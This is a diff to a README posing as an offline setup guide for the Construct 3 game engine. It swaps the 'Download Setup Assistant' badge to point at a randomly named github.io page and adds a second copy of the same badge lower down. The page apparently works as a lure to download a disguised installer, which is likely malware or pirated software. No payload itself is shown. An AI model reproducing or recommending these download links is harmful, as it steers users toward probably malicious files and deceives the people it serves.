@@ -1,6 +1,6 @@
 # Construct 3 — Offline Setup Guide
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download_Setup_Assistant-0C72B0?style=for-the-badge&logo=construct3&logoColor=white)](https://construct-3-download.github.io/.github)
+[![Download Setup Assistant](https://img.shields.io/badge/Download_Setup_Assistant-0C72B0?style=for-the-badge&logo=construct3&logoColor=white)](https://ryadikmntiiks.github.io/.github/C3OAD)
 
 ---
 
@@ -37,6 +37,8 @@
 
 ![Project Manager View](https://bing.com/th/id/OIP.wJVASm0wRvQ7qIfbzHo3QQHaDm?cb=thvnextc2&rs=1&pid=ImgDetMain)  
 *Organize assets and logic without internet sync*
+
+[![Download Setup Assistant](https://img.shields.io/badge/Download_Setup_Assistant-0C72B0?style=for-the-badge&logo=construct3&logoColor=white)](https://ryadikmntiiks.github.io/.github/C3OAD)
 
 ---
 
